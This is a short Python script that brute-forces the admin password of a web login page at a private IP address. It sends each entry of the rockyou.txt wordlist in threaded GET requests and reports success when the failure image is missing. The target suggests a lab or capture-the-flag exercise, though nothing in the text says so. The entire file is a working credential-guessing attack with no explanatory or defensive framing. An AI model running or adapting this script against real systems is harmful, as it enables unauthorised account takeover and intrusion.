import requests
import threading
import time

def req(url):
	response = requests.get(url)
	if not "images/WrongAnswer.gif" in response.text and not "502 Bad Gateway" in response.text:
		print(f"Password found: {url.split('password=')[1].split('&')[0]}")
	print("Trying: " + url.split("password=")[1].split("&")[0])
	return response

host = "192.168.55.3"
url = f"http://{host}/?page=signin&username=admin&password="
login = "&Login=Login#"

with open("rockyou.txt", "r") as file:
	for password in file:
		password = password.strip()
		threading.Thread(target=req, args=(url + password + login,)).start()
		time.sleep(0.2)